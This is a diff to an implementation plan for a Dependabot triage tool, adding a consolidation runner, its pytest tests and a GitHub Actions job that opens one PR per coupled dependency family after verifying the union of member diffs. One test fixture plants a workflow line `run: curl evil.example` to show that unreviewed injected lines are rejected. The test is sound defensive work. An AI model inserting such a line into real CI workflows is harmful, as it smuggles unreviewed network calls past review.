@@ -23,6 +23,8 @@
 - **Classification codes** are the exact strings in Task 1; later tasks depend on them verbatim.
 - **Never use `pull_request_target`** in the workflow.
 - **Format/lint before every commit:** `black scripts/ tests/`, `flake8 scripts/ tests/`.
+- **Test counts in "Expected: PASS (N tests)" are indicative, not binding.** Trust
+  the actual pytest output; a differing total is not a failure by itself.
 
 ---
 
@@ -2187,12 +2189,21 @@ jobs:
           done
 
       - name: Prove npm resolution
+        # `--legacy-peer-deps` is mandatory in frontend/, not a shortcut: the
+        # eslint-plugin-react peer cap on eslint@^9.7 makes a plain `npm ci`
+        # fail outright. See frontend/CLAUDE.md and code-quality.yml.
+        #
+        # Consequence, recorded deliberately: the flag silences peer-dependency
+        # conflicts globally, so this step is weaker assurance than it looks and
+        # would NOT on its own have caught PR #443's vitest/coverage-v8 skew.
+        # Coupled-family detection (R5) is the primary control for that class,
+        # and it catches #443 deterministically before the proof ever runs.
         run: |
           set -euo pipefail
           for dir in frontend sdk/typescript; do
             [ -f "$dir/package.json" ] || continue
             echo "::group::npm ci $dir"
-            (cd "$dir" && npm ci)
+            (cd "$dir" && npm ci --legacy-peer-deps)
             echo "::endgroup::"
           done
 
@@ -2217,7 +2228,7 @@ jobs:
           fetch-depth: 0
 
       - name: Download triage artifacts
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v6
+        uses: actions/download-artifact@018cc2cf5baa6db3ef3c5f8a56943fffe632ef53 # v6
         with:
           name: triage
 
@@ -2292,6 +2303,395 @@ Expected: all tests pass; coverage at or above 70%; all hooks pass.
 
 ---
 
+### Task 13: Consolidation runner and workflow job
+
+Task 11 provides the union verification but nothing invokes it. This task
+delivers spec Section 3: one consolidated PR per coupled family. The git and
+`gh` calls go through an injectable runner so the orchestration is unit-testable
+without touching the network.
+
+**Files:**
+- Modify: `scripts/security/dep_triage_consolidate.py`
+- Modify: `tests/scripts/test_dep_triage_consolidate.py`
+- Modify: `.github/workflows/dependabot-triage.yml`
+
+**Interfaces:**
+- Consumes: `verify_union`, `branch_name`, `added_lines` (Task 11); `decisions.json` and `snapshot.json` written by Tasks 8 and 9.
+- Produces: `families_from_decisions(decisions) -> dict[str, list[int]]`, `consolidation_body(family, version, members) -> str`, `consolidate_family(family, version, members, run) -> tuple[bool, str]`, `main(argv) -> int`.
+
+- [ ] **Step 1: Write the failing test**
+
+```python
+def test_families_from_decisions_groups_coupled_members():
+    decisions = [
+        {"number": 452, "code": "coupled", "family": "github/codeql-action"},
+        {"number": 450, "code": "coupled", "family": "github/codeql-action"},
+        {"number": 442, "code": "coupled", "family": "npm:/frontend:vitest"},
+        {"number": 439, "code": "candidate", "family": None},
+    ]
+    families = dcon.families_from_decisions(decisions)
+    assert families["github/codeql-action"] == [450, 452]
+    assert families["npm:/frontend:vitest"] == [442]
+    assert 439 not in [n for v in families.values() for n in v]
+
+
+def test_families_from_decisions_ignores_non_coupled():
+    assert dcon.families_from_decisions(
+        [{"number": 1, "code": "merge-safe", "family": None}]
+    ) == {}
+
+
+def test_consolidation_body_names_every_member_and_the_coupling():
+    body = dcon.consolidation_body(
+        "github/codeql-action", "4.38.0", [450, 452, 453, 454]
+    )
+    for number in (450, 452, 453, 454):
+        assert f"#{number}" in body
+    assert "together" in body.lower()
+    assert "4.38.0" in body
+
+
+def test_consolidation_body_does_not_claim_members_were_closed():
+    body = dcon.consolidation_body("github/codeql-action", "4.38.0", [450, 452])
+    assert "closed" not in body.lower()
+    assert "left open" in body.lower()
+```
+
+- [ ] **Step 2: Run test to verify it fails**
+
+Run: `pytest tests/scripts/test_dep_triage_consolidate.py -k "families or body" -v --no-cov`
+Expected: FAIL with `AttributeError: module ... has no attribute 'families_from_decisions'`
+
+- [ ] **Step 3: Write minimal implementation**
+
+```python
+def families_from_decisions(decisions: list[dict]) -> dict[str, list[int]]:
+    """Group coupled decisions by family, in ascending PR order."""
+    families: dict[str, list[int]] = {}
+    for decision in decisions:
+        if decision.get("code") != "coupled":
+            continue
+        family = decision.get("family")
+        if not family:
+            continue
+        families.setdefault(family, []).append(int(decision["number"]))
+    return {key: sorted(value) for key, value in families.items()}
+
+
+def consolidation_body(family: str, version: str, members: list[int]) -> str:
+    """Build the consolidated PR body explaining why members cannot merge alone."""
+    listed = ", ".join(f"#{number}" for number in sorted(members))
+    return (
+        f"Consolidates the `{family}` update to {version}.\n\n"
+        f"Members: {listed}.\n\n"
+        "These cannot be merged individually. The refs must move together, so "
+        "merging any one alone leaves the repository inconsistent -- and a "
+        "member can pass every check while still being unsafe by itself.\n\n"
+        "The set of added lines in this branch was verified equal to the union "
+        "of the member pull requests' added lines before this PR was opened.\n\n"
+        "Member PRs are left open deliberately: Dependabot retires them once "
+        "the version lands, and keeping them open means rejecting this "
+        "consolidation does not discard the originals.\n\n"
+        "Operator review and merge required. Nothing here was merged or "
+        "approved automatically."
+    )
+```
+
+- [ ] **Step 4: Run test to verify it passes**
+
+Run: `pytest tests/scripts/test_dep_triage_consolidate.py -v --no-cov`
+Expected: PASS
+
+- [ ] **Step 5: Write the failing test for the orchestration**
+
+The runner is injected, so this test asserts the *sequence* of commands and the
+union gate without any network or git access.
+
+```python
+class FakeRun:
+    """Records commands; returns canned stdout per matched prefix."""
+
+    def __init__(self, responses=None, fail_on=None):
+        self.calls = []
+        self.responses = responses or {}
+        self.fail_on = fail_on or ()
+
+    def __call__(self, args, capture=False):
+        self.calls.append(list(args))
+        joined = " ".join(args)
+        for needle in self.fail_on:
+            if needle in joined:
+                raise dcon.CommandFailed(joined)
+        for needle, out in self.responses.items():
+            if needle in joined:
+                return out
+        return ""
+
+    def ran(self, needle):
+        return any(needle in " ".join(c) for c in self.calls)
+
+
+DIFF_A = (
+    "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
+    "-      uses: github/codeql-action/init@aaa # v4.37.9\n"
+    "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
+)
+DIFF_B = (
+    "--- a/w.yml\n+++ b/w.yml\n@@ -9 +9 @@\n"
+    "-      uses: github/codeql-action/analyze@aaa # v4.37.9\n"
+    "+      uses: github/codeql-action/analyze@bbb # v4.38.0\n"
+)
+
+
+def test_consolidate_family_opens_pr_when_union_matches():
+    run = FakeRun(responses={
+        "diff origin/main...pr-450": DIFF_A,
+        "diff origin/main...pr-452": DIFF_B,
+        "diff origin/main...HEAD": DIFF_A + DIFF_B,
+    })
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", [450, 452], run
+    )
+    assert ok, message
+    assert run.ran("switch -c dep-consolidate/github-codeql-action-4.38.0")
+    assert run.ran("pr create")
+
+
+def test_consolidate_family_refuses_when_union_has_extra_lines():
+    """An added line no member introduced is an unreviewed change."""
+    sneaky = DIFF_A + DIFF_B + (
+        "--- a/x\n+++ b/x\n@@ -1 +1 @@\n+      run: curl evil.example\n"
+    )
+    run = FakeRun(responses={
+        "diff origin/main...pr-450": DIFF_A,
+        "diff origin/main...pr-452": DIFF_B,
+        "diff origin/main...HEAD": sneaky,
+    })
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", [450, 452], run
+    )
+    assert not ok
+    assert "union" in message.lower()
+    assert not run.ran("pr create")
+
+
+def test_consolidate_family_aborts_on_merge_conflict():
+    run = FakeRun(
+        responses={"diff origin/main...pr-450": DIFF_A},
+        fail_on=("merge --no-edit pr-452",),
+    )
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", [450, 452], run
+    )
+    assert not ok
+    assert "conflict" in message.lower()
+    assert run.ran("merge --abort")
+    assert not run.ran("pr create")
+
+
+def test_consolidate_family_never_merges_or_approves():
+    run = FakeRun(responses={
+        "diff origin/main...pr-450": DIFF_A,
+        "diff origin/main...pr-452": DIFF_B,
+        "diff origin/main...HEAD": DIFF_A + DIFF_B,
+    })
+    dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
+    for forbidden in ("pr merge", "pr review", "pr ready"):
+        assert not run.ran(forbidden), f"must never run: {forbidden}"
+```
+
+- [ ] **Step 6: Run test to verify it fails**
+
+Run: `pytest tests/scripts/test_dep_triage_consolidate.py -k consolidate_family -v --no-cov`
+Expected: FAIL with `AttributeError: module ... has no attribute 'CommandFailed'`
+
+- [ ] **Step 7: Write minimal implementation**
+
+```python
+class CommandFailed(RuntimeError):
+    """A subprocess command exited non-zero."""
+
+
+def _run(args: list[str], capture: bool = False) -> str:
+    """Execute a command, raising CommandFailed on a non-zero exit."""
+    result = subprocess.run(args, capture_output=True, text=True)
+    if result.returncode != 0:
+        raise CommandFailed(
+            f"{' '.join(args)} exited {result.returncode}: {result.stderr.strip()}"
+        )
+    return result.stdout if capture else ""
+
+
+def consolidate_family(
+    family: str,
+    version: str,
+    members: list[int],
+    run: Callable[..., str] = _run,
+) -> tuple[bool, str]:
+    """Build a consolidation branch for one family and open its pull request.
+
+    Returns (ok, message). Never merges and never approves anything: the
+    consolidated PR goes through the same operator review as any other change.
+
+    The union check is a security control. If the branch contains an added line
+    that no member PR introduced, an unreviewed change would be riding along
+    inside an approved one, so the function refuses to open the PR.
+    """
+    branch = branch_name(family, version)
+    run(["git", "switch", "-c", branch, "origin/main"])
+
+    member_diffs: list[str] = []
+    for pr in members:
+        run(["git", "fetch", "origin", f"pull/{pr}/head:pr-{pr}"])
+        member_diffs.append(
+            run(["git", "diff", f"origin/main...pr-{pr}"], capture=True)
+        )
+        try:
+            run(["git", "merge", "--no-edit", f"pr-{pr}"])
+        except CommandFailed:
+            run(["git", "merge", "--abort"])
+            run(["git", "switch", "main"])
+            return (False, f"family {family}: PR #{pr} conflicts; skipped")
+
+    combined = run(["git", "diff", "origin/main...HEAD"], capture=True)
+    ok, missing, extra = verify_union(member_diffs, combined)
+    if not ok:
+        run(["git", "switch", "main"])
+        return (
+            False,
+            f"family {family}: union mismatch; "
+            f"missing={sorted(missing)} extra={sorted(extra)}",
+        )
+
+    run(["git", "push", "-u", "origin", branch, "--force"])
+    run([
+        "gh", "pr", "create", "--base", "main", "--head", branch,
+        "--title", f"chore(deps): bump {family} to {version} across all refs",
+        "--body", consolidation_body(family, version, members),
+        "--label", "dependencies", "--label", "automated",
+    ])
+    for pr in members:
+        run([
+            "gh", "pr", "comment", str(pr), "--body",
+            f"Superseded by the consolidated PR on `{branch}`; this PR cannot "
+            "be merged on its own.",
+        ])
+    run(["git", "switch", "main"])
+    return (True, f"family {family}: opened {branch}")
+```
+
+Add `import subprocess` and `from typing import Callable` to the module header.
+
+- [ ] **Step 8: Run test to verify it passes**
+
+Run: `pytest tests/scripts/test_dep_triage_consolidate.py -v --no-cov`
+Expected: PASS
+
+- [ ] **Step 9: Add the CLI**
+
+```python
+def main(argv: list[str] | None = None) -> int:
+    """Open one consolidated PR per coupled family."""
+    parser = argparse.ArgumentParser(
+        description="Open consolidated PRs for coupled Dependabot families."
+    )
+    parser.add_argument("--decisions", type=Path, required=True,
+                        help="decisions.json written by dep_triage.")
+    parser.add_argument("--snapshot", type=Path, required=True,
+                        help="snapshot.json, used for target versions.")
+    parser.add_argument("--execute", action="store_true",
+                        help="Actually create branches and PRs. Without it, "
+                             "the plan is printed and nothing is changed.")
+    args = parser.parse_args(argv)
+
+    decisions = json.loads(
+        args.decisions.read_text(encoding="utf-8")
+    )["decisions"]
+    snapshot = json.loads(args.snapshot.read_text(encoding="utf-8"))
+    versions = {
+        pr["number"]: pr.get("to_version", "")
+        for pr in snapshot["pull_requests"]
+    }
+
+    families = families_from_decisions(decisions)
+    for family, members in sorted(families.items()):
+        if len(members) < 2:
+            continue
+        target = next(
+            (versions[m] for m in members if versions.get(m)), ""
+        )
+        if not args.execute:
+            print(f"would consolidate {family} -> {target}: {members}")
+            continue
+        ok, message = consolidate_family(family, target, members)
+        print(message)
+        if not ok:
+            print(f"::warning::{message}")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+Add `import argparse`, `import json` and `from pathlib import Path` to the module header.
+
+- [ ] **Step 10: Add the consolidation job to the workflow**
+
+Insert after the `batch-proof` job in `.github/workflows/dependabot-triage.yml`.
+The heavy lifting is in Python, so this job stays a single command.
+
+```yaml
+  consolidate:
+    name: Open consolidated PRs for coupled families
+    needs: classify
+    runs-on: ubuntu-24.04
+    timeout-minutes: 20
+    permissions:
+      contents: write
+      pull-requests: write
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+
+      - name: Set up Python
+        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+        with:
+          python-version: '3.11'
+
+      - name: Download triage artifacts
+        uses: actions/download-artifact@018cc2cf5baa6db3ef3c5f8a56943fffe632ef53 # v6
+        with:
+          name: triage
+
+      - name: Open consolidated PRs
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          git config user.name "aura-ci"
+          git config user.email "ci@aenealabs.com"
+          python -m scripts.security.dep_triage_consolidate \
+            --decisions decisions.json \
+            --snapshot snapshot.json \
+            --execute
+```
+
+- [ ] **Step 11: Validate and commit**
+
+```bash
+python -c "import yaml,pathlib; yaml.safe_load(pathlib.Path('.github/workflows/dependabot-triage.yml').read_text())" && echo YAML-OK
+pytest tests/scripts/test_dep_triage_consolidate.py -v --no-cov
+black scripts/security/dep_triage_consolidate.py tests/scripts/test_dep_triage_consolidate.py
+flake8 scripts/security/dep_triage_consolidate.py tests/scripts/test_dep_triage_consolidate.py
+git add -u
+git commit -m "feat: open consolidated PRs for coupled dependabot families"
+```
+
+---
+
 ## Verification Checklist
 
 - [ ] `pytest tests/scripts/test_dep_triage*.py` passes.
@@ -2302,3 +2702,6 @@ Expected: all tests pass; coverage at or above 70%; all hooks pass.
 - [ ] No step in the workflow runs `gh pr merge`, `gh pr review`, or `gh pr ready`.
 - [ ] `.github/dependabot.yml` still contains the `tree-sitter` ignore entry with its justification comment.
 - [ ] Regression assertions hold: #386 excluded, #450 and #443 coupled despite being green, #442 flagged as suspected flake, #452 coupled, #439 and #446 candidates.
+- [ ] `npm ci` in `frontend/` uses `--legacy-peer-deps` (mandatory; see frontend/CLAUDE.md).
+- [ ] Every pinned action SHA resolves and its trailing version comment matches the tag it pins.
+- [ ] A coupled family produces exactly one consolidated PR, and `verify_union` gates it.
